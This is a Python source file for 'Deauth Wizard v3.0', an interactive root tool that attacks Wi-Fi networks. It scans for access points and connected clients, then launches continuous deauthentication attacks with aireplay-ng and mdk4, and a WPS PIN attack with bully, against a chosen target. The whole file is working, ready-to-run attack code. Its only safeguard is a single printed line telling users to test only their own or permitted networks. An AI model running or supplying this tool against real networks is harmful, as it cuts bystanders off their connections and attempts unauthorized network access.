#!/usr/bin/env python3

import os
import sys
import time
import signal
import subprocess
import logging
import threading
from typing import Dict, List, Optional

logging.basicConfig(level=logging.INFO, format="%(message)s")

COLOR_ENABLED = sys.stdout.isatty()
COLOR_RESET = "\033[0m" if COLOR_ENABLED else ""
COLOR_HEADER = "\033[36m" if COLOR_ENABLED else ""
COLOR_HIGHLIGHT = "\033[35m" if COLOR_ENABLED else ""
COLOR_SUCCESS = "\033[32m" if COLOR_ENABLED else ""
COLOR_WARNING = "\033[33m" if COLOR_ENABLED else ""
COLOR_ERROR = "\033[31m" if COLOR_ENABLED else ""
STYLE_BOLD = "\033[1m" if COLOR_ENABLED else ""

# Global attack process variable
ATTACK_PROCESS: Optional[subprocess.Popen] = None
ATTACK_RUNNING = False


def color_text(text: str, color: str) -> str:
    return f"{color}{text}{COLOR_RESET}" if color else text


def style(text: str, *styles: str) -> str:
    prefix = "".join(s for s in styles if s)
    return f"{prefix}{text}{COLOR_RESET}" if prefix else text


def print_header(title: str, subtitle: Optional[str] = None) -> None:
    logging.info(color_text(title, COLOR_HEADER))
    if subtitle:
        logging.info(subtitle)
    logging.info("")


def prompt_int(prompt: str, default: int, minimum: int = 1) -> int:
    raw = input(prompt).strip()
    if not raw:
        return default
    try:
        value = int(raw)
    except ValueError:
        return default
    if value < minimum:
        return minimum
    return value


def list_network_interfaces() -> List[str]:
    interfaces: List[str] = []
    ip_link = subprocess.run(["ip", "-o", "link", "show"], stdout=subprocess.PIPE, text=True, check=False)
    for line in ip_link.stdout.splitlines():
        if ": " in line:
            name = line.split(": ", 1)[1].split(":", 1)[0]
            if name and name != "lo":
                interfaces.append(name)
    return interfaces


def get_interface_chipset(interface: str) -> str:
    try:
        result = subprocess.run(
            ["ethtool", "-i", interface],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            check=False,
        )
    except FileNotFoundError:
        return "unknown"

    if result.returncode != 0:
        return "unknown"

    driver = None
    bus_info = None
    for line in result.stdout.splitlines():
        if line.startswith("driver:"):
            driver = line.split(":", 1)[1].strip()
        if line.startswith("bus-info:"):
            bus_info = line.split(":", 1)[1].strip()

    if driver and bus_info and bus_info != "":
        return f"{driver} ({bus_info})"
    if driver:
        return driver
    return "unknown"


def select_interface(interfaces: List[str]) -> str:
    if not interfaces:
        logging.error("No network interfaces found.")
        sys.exit(1)

    logging.info("")
    logging.info(style("Available interfaces:", STYLE_BOLD))
    for index, name in enumerate(interfaces, start=1):
        chipset = get_interface_chipset(name)
        label = f"{index}) {name} -"
        logging.info("  %s %s", color_text(label, COLOR_HIGHLIGHT), chipset)

    while True:
        choice = input(f"{style('Select interface', STYLE_BOLD)} (number or name): ").strip()
        if not choice:
            logging.warning("Please select an interface.")
            continue
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(interfaces):
                return interfaces[idx - 1]
        if choice in interfaces:
            return choice
        logging.warning("Invalid selection. Try again.")


def get_interface_mode(interface: str) -> Optional[str]:
    result = subprocess.run(
        ["iw", "dev", interface, "info"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        check=False,
    )
    if result.returncode != 0:
        return None
    for raw_line in result.stdout.splitlines():
        line = raw_line.strip()
        if line.startswith("type "):
            parts = line.split()
            if len(parts) >= 2:
                return parts[1]
    return None


def is_monitor_mode(interface: str) -> bool:
    return get_interface_mode(interface) == "monitor"


def set_interface_type(interface: str, mode: str) -> bool:
    try:
        subprocess.run(["ip", "link", "set", interface, "down"], check=False, stderr=subprocess.DEVNULL)
        result = subprocess.run(
            ["iw", "dev", interface, "set", "type", mode],
            stderr=subprocess.PIPE,
            text=True,
            check=False,
        )
        if result.returncode != 0:
            logging.error("Failed to set %s mode: %s", mode, result.stderr.strip() or "unknown error")
            return False
        subprocess.run(["ip", "link", "set", interface, "up"], check=False, stderr=subprocess.DEVNULL)
        time.sleep(0.5)
        return True
    except Exception as exc:
        logging.error("Failed to set %s mode: %s", mode, exc)
        return False


def restore_managed_mode(interface: str) -> None:
    try:
        subprocess.run(["ip", "link", "set", interface, "down"], check=False, stderr=subprocess.DEVNULL)
        subprocess.run(["iw", "dev", interface, "set", "type", "managed"], check=False, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "link", "set", interface, "up"], check=False, stderr=subprocess.DEVNULL)
    except Exception:
        pass


def freq_to_channel(freq: float) -> Optional[int]:
    if 2412 <= freq <= 2472:
        return int((freq - 2407) // 5)
    if freq == 2484:
        return 14
    if 5000 <= freq <= 5825:
        return int((freq - 5000) // 5)
    return None


def parse_channel_value(text: str) -> Optional[int]:
    try:
        return int(text)
    except (TypeError, ValueError):
        return None


def parse_freq_value(text: str) -> Optional[float]:
    try:
        value = float(text)
    except (TypeError, ValueError):
        return None
    if value > 100000:
        value /= 1000.0
    return value


def scan_wireless_networks(
    interface: str,
    duration_seconds: int = 15,
    show_progress: bool = False,
) -> List[Dict[str, Optional[str]]]:
    def run_scan() -> subprocess.CompletedProcess:
        return subprocess.run(
            ["iw", "dev", interface, "scan"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=False,
        )

    end_time = time.time() + max(1, duration_seconds)
    networks: Dict[str, Dict[str, Optional[str]]] = {}
    last_remaining = None
    while time.time() < end_time:
        if show_progress and COLOR_ENABLED:
            remaining = max(0, int(end_time - time.time()))
            if remaining != last_remaining:
                last_remaining = remaining
                message = (
                    f"{style('Scanning', STYLE_BOLD)}... "
                    f"{style(str(remaining), COLOR_SUCCESS, STYLE_BOLD)}s remaining"
                )
                sys.stdout.write("\r" + message)
                sys.stdout.flush()
        try:
            result = run_scan()
        except FileNotFoundError:
            logging.error("Required tool 'iw' not found!")
            if show_progress and COLOR_ENABLED:
                sys.stdout.write("\n")
            return []

        if result.returncode != 0 and is_monitor_mode(interface):
            if set_interface_type(interface, "managed"):
                result = run_scan()
                if not set_interface_type(interface, "monitor"):
                    logging.error("Failed to restore monitor mode after scan.")

        if result.returncode != 0:
            logging.error("Wireless scan failed: %s", result.stderr.strip() or "unknown error")
            if show_progress and COLOR_ENABLED:
                sys.stdout.write("\n")
            return []

        current: Dict[str, Optional[str]] = {}
        for raw_line in result.stdout.splitlines():
            line = raw_line.strip()
            if line.startswith("BSS "):
                if current.get("bssid") and current.get("ssid"):
                    existing = networks.get(current["bssid"])
                    if existing is None or (
                        current.get("signal") is not None
                        and (existing.get("signal") is None or current["signal"] > existing["signal"])
                    ):
                        networks[current["bssid"]] = current
                current = {"bssid": line.split()[1].split("(")[0], "ssid": None, "signal": None, "channel": None}
                continue
            if line.startswith("freq:"):
                parts = line.split()
                freq_val = parse_freq_value(parts[1]) if len(parts) > 1 else None
                current["channel"] = freq_to_channel(freq_val) if freq_val is not None else None
                continue
            if line.startswith("DS Parameter set:"):
                parts = line.split()
                if len(parts) >= 4 and parts[-2] == "channel":
                    channel_val = parse_channel_value(parts[-1])
                    if channel_val is not None:
                        current["channel"] = channel_val
                continue
            if line.startswith("* primary channel:"):
                parts = line.split(":")
                if len(parts) == 2:
                    channel_val = parse_channel_value(parts[1].strip())
                    if channel_val is not None:
                        current["channel"] = channel_val
                continue
            if line.startswith("signal:"):
                parts = line.split()
                try:
                    current["signal"] = float(parts[1])
                except (IndexError, ValueError):
                    current["signal"] = None
                continue
            if line.startswith("SSID:"):
                ssid_val = line.split(":", 1)[1].strip()
                current["ssid"] = ssid_val if ssid_val else "<hidden>"

        if current.get("bssid") and current.get("ssid"):
            existing = networks.get(current["bssid"])
            if existing is None or (
                current.get("signal") is not None
                and (existing.get("signal") is None or current["signal"] > existing["signal"])
            ):
                networks[current["bssid"]] = current

        time.sleep(0.2)

    if show_progress and COLOR_ENABLED:
        sys.stdout.write("\n")

    sorted_networks = sorted(
        networks.values(),
        key=lambda item: item["signal"] if item["signal"] is not None else -1000,
        reverse=True,
    )
    return sorted_networks


def select_network(attack_interface: str, duration_seconds: int) -> Dict[str, Optional[str]]:
    while True:
        networks = scan_wireless_networks(attack_interface, duration_seconds, show_progress=True)
        if not networks:
            logging.warning("No networks found during scan.")
            retry = input(f"{style('Rescan', STYLE_BOLD)}? (Y/N): ").strip().lower()
            if retry == "y":
                continue
            sys.exit(1)

        logging.info("")
        logging.info(style("Available networks:", STYLE_BOLD))
        for index, net in enumerate(networks, start=1):
            signal = f"{net['signal']:.1f} dBm" if net["signal"] is not None else "signal unknown"
            channel = f"ch {net['channel']}" if net["channel"] else "ch ?"
            label = f"{index}) {net['ssid']} ({net['bssid']}) -"
            logging.info("  %s %s %s", color_text(label, COLOR_HIGHLIGHT), channel, signal)

        choice = input(
            f"{style('Select network', STYLE_BOLD)} (number, or R to rescan): "
        ).strip().lower()
        if choice == "r":
            continue
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(networks):
                return networks[idx - 1]
        logging.warning("Invalid selection. Try again.")


SELECTED_INTERFACE: Optional[str] = None


def cleanup() -> None:
    if SELECTED_INTERFACE:
        restore_managed_mode(SELECTED_INTERFACE)
    stop_attack()


def test_packet_injection(interface: str) -> bool:
    """Test packet injection with aireplay-ng"""
    logging.info(color_text("\n[TEST] Testing packet injection...", COLOR_HEADER))
    
    # Test 1: Basic injection test
    test_cmd = ["aireplay-ng", "--test", interface]
    
    try:
        result = subprocess.run(
            test_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=10
        )
        
        if result.returncode == 0:
            if "Injection is working!" in result.stdout:
                logging.info(color_text("✓ Packet injection working!", COLOR_SUCCESS))
                return True
            else:
                logging.warning("Injection test output:")
                print(result.stdout[:500])
                return False
        else:
            logging.error("Injection test failed:")
            print(result.stderr[:500])
            return False
            
    except subprocess.TimeoutExpired:
        logging.error("Injection test timeout")
        return False
    except Exception as e:
        logging.error(f"Injection test error: {e}")
        return False


def find_connected_clients(interface: str, bssid: str, channel: int) -> List[str]:
    """Find clients connected to the target network using airodump-ng"""
    clients = []
    
    # First set the channel
    subprocess.run(["iw", "dev", interface, "set", "channel", str(channel)], 
                   stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    
    # Create a temporary csv file for airodump output
    import tempfile
    with tempfile.NamedTemporaryFile(suffix='.csv', delete=False) as tmpfile:
        csv_file = tmpfile.name
    
    try:
        # Run airodump for 5 seconds to capture clients
        logging.info(color_text(f"\n[SCAN] Looking for clients on {bssid}...", COLOR_HEADER))
        
        airodump_cmd = [
            "airodump-ng",
            "-c", str(channel),
            "--bssid", bssid,
            "-w", csv_file.replace('.csv', ''),  # airodump adds .csv automatically
            interface,
            "--output-format", "csv"
        ]
        
        # Run airodump in background for 5 seconds
        proc = subprocess.Popen(
            airodump_cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            preexec_fn=os.setsid
        )
        
        time.sleep(5)
        
        # Kill the process
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            proc.wait(timeout=2)
        except:
            pass
        
        # Read the CSV file
        if os.path.exists(csv_file):
            with open(csv_file, 'r') as f:
                lines = f.readlines()
                for line in lines:
                    if ',' in line and len(line.split(',')) > 1:
                        parts = line.strip().split(',')
                        if len(parts) > 1:
                            mac = parts[0].strip()
                            # Check if it's a client MAC (not BSSID)
                            if mac and mac != bssid and len(mac) == 17 and ':' in mac:
                                clients.append(mac)
            
            if clients:
                logging.info(color_text(f"✓ Found {len(clients)} client(s):", COLOR_SUCCESS))
                for client in clients[:5]:  # Show first 5 clients
                    logging.info(f"  • {client}")
                if len(clients) > 5:
                    logging.info(f"  ... and {len(clients) - 5} more")
            else:
                logging.warning("No clients found. Attack may still work with broadcast deauth.")
        
        # Cleanup
        try:
            os.unlink(csv_file)
            # Remove other airodump files
            for ext in ['.csv', '.kismet.csv', '.netxml']:
                try:
                    os.unlink(csv_file.replace('.csv', '') + ext)
                except:
                    pass
        except:
            pass
            
    except Exception as e:
        logging.error(f"Client scan error: {e}")
    
    return clients


def start_deauth_attack_method1(interface: str, bssid: str, channel: int, clients: List[str] = None) -> Optional[subprocess.Popen]:
    """Method 1: aireplay-ng attack"""
    logging.info(color_text("\n[METHOD 1] Starting aireplay-ng attack...", COLOR_HEADER))
    
    if clients:
        # Attack specific clients
        for client_mac in clients:
            logging.info(f"Attacking client: {client_mac}")
            cmd = [
                "aireplay-ng",
                "-0", "0",  # 0 means continuous
                "-a", bssid,
                "-c", client_mac,
                interface
            ]
    else:
        # Broadcast attack (all clients)
        logging.info("Broadcast attack (all clients)")
        cmd = [
            "aireplay-ng",
            "-0", "0",  # 0 means continuous
            "-a", bssid,
            interface
        ]
    
    try:
        logging.info(f"Running: {' '.join(cmd)}")
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True,
            preexec_fn=os.setsid
        )
        
        # Wait a bit to see if it starts
        time.sleep(2)
        
        if process.poll() is not None:
            stderr = process.stderr.read() if process.stderr else ""
            logging.error(f"Process exited immediately: {stderr[:200]}")
            return None
        
        logging.info(color_text("✓ aireplay-ng attack started", COLOR_SUCCESS))
        return process
        
    except Exception as e:
        logging.error(f"aireplay-ng error: {e}")
        return None


def start_deauth_attack_method2(interface: str, bssid: str, channel: int) -> Optional[subprocess.Popen]:
    """Method 2: mdk4 attack (more aggressive)"""
    logging.info(color_text("\n[METHOD 2] Starting mdk4 attack...", COLOR_HEADER))
    
    # Check if mdk4 is installed
    if subprocess.run(["which", "mdk4"], stdout=subprocess.DEVNULL).returncode != 0:
        logging.error("mdk4 not installed. Install with: sudo apt install mdk4")
        return None
    
    # Create target file for mdk4
    import tempfile
    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
        f.write(f"{bssid}\n")
        target_file = f.name
    
    try:
        cmd = [
            "mdk4", interface, "d",
            "-b", target_file,
            "-c", str(channel)
        ]
        
        logging.info(f"Running: {' '.join(cmd)}")
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True,
            preexec_fn=os.setsid
        )
        
        time.sleep(2)
        
        if process.poll() is not None:
            stderr = process.stderr.read() if process.stderr else ""
            logging.error(f"mdk4 exited immediately: {stderr[:200]}")
            os.unlink(target_file)
            return None
        
        logging.info(color_text("✓ mdk4 attack started", COLOR_SUCCESS))
        
        # Cleanup file after process starts
        os.unlink(target_file)
        return process
        
    except Exception as e:
        logging.error(f"mdk4 error: {e}")
        try:
            os.unlink(target_file)
        except:
            pass
        return None


def start_deauth_attack_method3(interface: str, bssid: str, channel: int) -> Optional[subprocess.Popen]:
    """Method 3: Using bully for WPS deauth (if WPS enabled)"""
    logging.info(color_text("\n[METHOD 3] Checking for WPS...", COLOR_HEADER))
    
    # Check if bully is installed
    if subprocess.run(["which", "bully"], stdout=subprocess.DEVNULL).returncode != 0:
        logging.warning("bully not installed. Skipping WPS method.")
        return None
    
    try:
        # First check if WPS is enabled
        check_cmd = ["bully", interface, "-b", bssid, "-c", str(channel), "--check"]
        result = subprocess.run(check_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=10)
        
        if "WPS enabled: yes" in result.stdout or "WPS locked: no" in result.stdout:
            logging.info("WPS is enabled! Starting bully attack...")
            
            cmd = [
                "bully", interface,
                "-b", bssid,
                "-c", str(channel),
                "-v", "3"
            ]
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True,
                preexec_fn=os.setsid
            )
            
            time.sleep(2)
            
            if process.poll() is not None:
                logging.warning("bully exited immediately")
                return None
            
            logging.info(color_text("✓ bully WPS attack started", COLOR_SUCCESS))
            return process
        else:
            logging.warning("WPS not enabled or not detectable")
            return None
            
    except Exception as e:
        logging.error(f"bully error: {e}")
        return None


def monitor_attack_output(process: subprocess.Popen):
    """Monitor and display attack output in real-time"""
    def read_output(stream, is_error=False):
        try:
            for line in iter(stream.readline, ''):
                line = line.strip()
                if line:
                    if is_error:
                        logging.warning(f"  [ERROR] {line}")
                    else:
                        if "sent" in line.lower() or "packet" in line.lower():
                            logging.info(color_text(f"  → {line}", COLOR_HIGHLIGHT))
                        elif "deauth" in line.lower() or "disassoc" in line.lower():
                            logging.info(color_text(f"  ✓ {line}", COLOR_SUCCESS))
        except:
            pass
    
    # Start reader threads
    import threading
    if process.stdout:
        t1 = threading.Thread(target=read_output, args=(process.stdout, False), daemon=True)
        t1.start()
    
    if process.stderr:
        t2 = threading.Thread(target=read_output, args=(process.stderr, True), daemon=True)
        t2.start()


def start_deauth_attack(interface: str, target: Dict[str, Optional[str]]) -> bool:
    global ATTACK_PROCESS, ATTACK_RUNNING
    bssid = target["bssid"]
    channel = target["channel"]
    
    if not bssid:
        logging.error("Missing target BSSID; cannot start attack.")
        return False

    # Set channel FIRST (before any tests)
    if channel:
        logging.info(color_text(f"\n[SETUP] Setting channel {channel}...", COLOR_HEADER))
        for attempt in range(3):
            result = subprocess.run(
                ["iw", "dev", interface, "set", "channel", str(channel)],
                stderr=subprocess.PIPE,
                stdout=subprocess.PIPE,
                text=True
            )
            if result.returncode == 0:
                logging.info(color_text(f"✓ Channel {channel} set", COLOR_SUCCESS))
                break
            else:
                logging.warning(f"Attempt {attempt+1} failed: {result.stderr.strip()}")
                time.sleep(1)

    # Test injection (non-blocking - just a warning if it fails)
    if not test_packet_injection(interface):
        logging.warning(color_text("⚠ Packet injection test failed, continuing anyway...", COLOR_WARNING))
        logging.info("Note: Some drivers don't respond to injection tests but still work.")

    # Find connected clients (optional but recommended)
    clients = []
    if channel:
        clients = find_connected_clients(interface, bssid, channel)

    # Try different attack methods
    methods = [
        ("aireplay-ng (broadcast)", lambda: start_deauth_attack_method1(interface, bssid, channel, [])),
        ("aireplay-ng (targeted)", lambda: start_deauth_attack_method1(interface, bssid, channel, clients[:1]) if clients else None),
        ("mdk4", lambda: start_deauth_attack_method2(interface, bssid, channel)),
        ("bully WPS", lambda: start_deauth_attack_method3(interface, bssid, channel))
    ]

    for method_name, method_func in methods:
        logging.info(color_text(f"\n[Trying {method_name}]", COLOR_HEADER))
        
        ATTACK_PROCESS = method_func()
        if ATTACK_PROCESS:
            # Start monitoring output
            monitor_attack_output(ATTACK_PROCESS)
            
            # Give it a moment to start
            time.sleep(3)
            
            if ATTACK_PROCESS.poll() is None:
                logging.info(color_text(f"✓ {method_name} attack running!", COLOR_SUCCESS))
                logging.info(f"PID: {ATTACK_PROCESS.pid}")
                ATTACK_RUNNING = True
                
                # Show attack stats
                logging.info(style("\n[ATTACK ACTIVE]", COLOR_SUCCESS, STYLE_BOLD))
                logging.info(f"• Target: {bssid}")
                logging.info(f"• Channel: {channel}")
                logging.info(f"• Method: {method_name}")
                if clients:
                    logging.info(f"• Targeting {len(clients)} client(s)")
                logging.info(f"• Interface: {interface}")
                
                return True
            else:
                logging.warning(f"{method_name} stopped unexpectedly")
                ATTACK_PROCESS = None

    logging.error(color_text("✗ All attack methods failed!", COLOR_ERROR))
    return False


def stop_attack() -> None:
    global ATTACK_PROCESS, ATTACK_RUNNING
    if ATTACK_PROCESS and ATTACK_PROCESS.poll() is None:
        logging.info("Stopping attack...")
        try:
            try:
                pgid = os.getpgid(ATTACK_PROCESS.pid)
            except Exception:
                pgid = None
            
            if pgid is not None:
                try:
                    os.killpg(pgid, signal.SIGTERM)
                except Exception:
                    ATTACK_PROCESS.terminate()
            else:
                ATTACK_PROCESS.terminate()
            
            try:
                ATTACK_PROCESS.wait(timeout=5)
            except subprocess.TimeoutExpired:
                try:
                    if pgid is not None:
                        os.killpg(pgid, signal.SIGKILL)
                    else:
                        ATTACK_PROCESS.kill()
                    ATTACK_PROCESS.wait(timeout=2)
                except Exception:
                    pass
        except Exception as e:
            logging.warning(f"Error while stopping attack: {e}")
        
        try:
            for _ in range(10):
                if ATTACK_PROCESS.poll() is not None:
                    break
                time.sleep(0.5)
        except Exception:
            pass
    
    ATTACK_PROCESS = None
    ATTACK_RUNNING = False


def attack_monitor() -> None:
    """Monitor attack status"""
    global ATTACK_RUNNING
    
    last_check = time.time()
    while ATTACK_RUNNING:
        time.sleep(2)
        
        if ATTACK_PROCESS is None:
            break
            
        if ATTACK_PROCESS.poll() is not None:
            logging.error("\n" + color_text("✗ Attack process stopped!", COLOR_ERROR))
            ATTACK_RUNNING = False
            break
        
        # Show status every 10 seconds
        if time.time() - last_check > 10:
            logging.info(color_text("✓ Attack still running...", COLOR_HIGHLIGHT))
            last_check = time.time()


def run_deauth_session() -> bool:
    global SELECTED_INTERFACE, ATTACK_RUNNING

    interfaces = list_network_interfaces()
    SELECTED_INTERFACE = select_interface(interfaces)

    logging.info("")
    input(f"{style('Press Enter', STYLE_BOLD)} to switch {SELECTED_INTERFACE} to monitor mode...")
    if not set_interface_type(SELECTED_INTERFACE, "monitor"):
        return False
    logging.info(color_text("✓ Monitor mode confirmed", COLOR_SUCCESS))

    logging.info("")
    scan_seconds = prompt_int(
        f"{style('Scan duration', STYLE_BOLD)} in seconds "
        f"({style('Enter', STYLE_BOLD)} for {style('15', COLOR_SUCCESS, STYLE_BOLD)}): ",
        default=15,
    )

    logging.info("")
    input(f"{style('Press Enter', STYLE_BOLD)} to scan networks on {SELECTED_INTERFACE}...")
    target_network = select_network(SELECTED_INTERFACE, scan_seconds)
    logging.info("")
    logging.info(
        "Target selected: %s (%s) on channel %s",
        style(target_network["ssid"], COLOR_SUCCESS, STYLE_BOLD),
        target_network["bssid"],
        style(str(target_network["channel"]), COLOR_HIGHLIGHT) if target_network["channel"] else "unknown"
    )

    if not is_monitor_mode(SELECTED_INTERFACE):
        logging.warning("Interface left monitor mode; re-enabling.")
        if not set_interface_type(SELECTED_INTERFACE, "monitor"):
            return False

    logging.info("")
    logging.info(style("="*60, STYLE_BOLD))
    logging.info(style("STARTING DEAUTHENTICATION ATTACK", COLOR_WARNING, STYLE_BOLD))
    logging.info(style("="*60, STYLE_BOLD))
    
    if not start_deauth_attack(SELECTED_INTERFACE, target_network):
        logging.error(color_text("Attack failed to start!", COLOR_ERROR))
        return False
    
    # Start monitor thread
    monitor_thread = threading.Thread(target=attack_monitor, daemon=True)
    monitor_thread.start()
    
    logging.info("")
    logging.info(style("ATTACK CONTROLS:", STYLE_BOLD))
    logging.info("  [S] - Stop and select new interface")
    logging.info("  [B] - Stop and return to main menu")
    logging.info("  [R] - Stop and scan for new target")
    logging.info("  [Ctrl+C] - Emergency stop")
    logging.info("")
    logging.info(style("Note:", COLOR_WARNING))
    logging.info("Watch for 'sent' or 'deauth' messages above to confirm attack is working.")
    logging.info("")
    
    try:
        while ATTACK_RUNNING:
            try:
                choice = input(
                    f"{style('Enter option', STYLE_BOLD)} (S/B/R): "
                ).strip().lower()
                
                if choice in {"s", "stop"}:
                    stop_attack()
                    logging.info(color_text("✓ Attack stopped", COLOR_SUCCESS))
                    logging.info("Returning to interface selection...")
                    logging.info("")
                    return True
                elif choice in {"b", "back"}:
                    stop_attack()
                    logging.info(color_text("✓ Attack stopped", COLOR_SUCCESS))
                    return False
                elif choice in {"r", "restart"}:
                    stop_attack()
                    logging.info(color_text("✓ Attack stopped", COLOR_SUCCESS))
                    logging.info("Restarting from network scan...")
                    logging.info("")
                    return True
                else:
                    logging.warning("Please enter S, B, or R.")
            except KeyboardInterrupt:
                logging.info("\n")
                confirm = input(f"{style('Really stop attack?', STYLE_BOLD)} (Y/N): ").strip().lower()
                if confirm in {"y", "yes"}:
                    stop_attack()
                    logging.info(color_text("✓ Attack stopped by user", COLOR_SUCCESS))
                    logging.info("")
                    break
                else:
                    logging.info("Continuing attack...")
                    continue
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
        stop_attack()
    
    return False


def main() -> None:
    print_header("DEAUTH WIZARD v3.0", "Multi-Method Wi-Fi Deauthentication Tool")
    logging.info(style("IMPORTANT:", COLOR_WARNING, STYLE_BOLD))
    logging.info("Use only on networks you own or have explicit permission to test!")
    logging.info("")

    if os.geteuid() != 0:
        logging.error("This script must be run as root!")
        sys.exit(1)

    # Check for required tools
    required_tools = ["iw", "ip", "aireplay-ng"]
    optional_tools = ["airodump-ng", "mdk4", "bully"]
    
    missing_required = []
    for tool in required_tools:
        if subprocess.run(["which", tool], stdout=subprocess.DEVNULL).returncode != 0:
            missing_required.append(tool)
    
    if missing_required:
        logging.error("Missing required tools: %s", ", ".join(missing_required))
        logging.info("Install with: sudo apt install wireless-tools aircrack-ng")
        sys.exit(1)
    
    # Check optional tools
    missing_optional = []
    for tool in optional_tools:
        if subprocess.run(["which", tool], stdout=subprocess.DEVNULL).returncode != 0:
            missing_optional.append(tool)
    
    if missing_optional:
        logging.warning("Optional tools not installed: %s", ", ".join(missing_optional))
        logging.info("For best results install: sudo apt install mdk4 bully")

    import atexit
    atexit.register(cleanup)

    while True:
        restart = run_deauth_session()
        if not restart:
            logging.info(color_text("Exiting Deauth Wizard.", COLOR_HEADER))
            break
        logging.info(color_text("\n" + "="*60, COLOR_HEADER))
        logging.info(color_text("RESTARTING DEAUTH WIZARD...", COLOR_HEADER, STYLE_BOLD))
        logging.info(color_text("="*60 + "\n", COLOR_HEADER))


if __name__ == "__main__":
    main()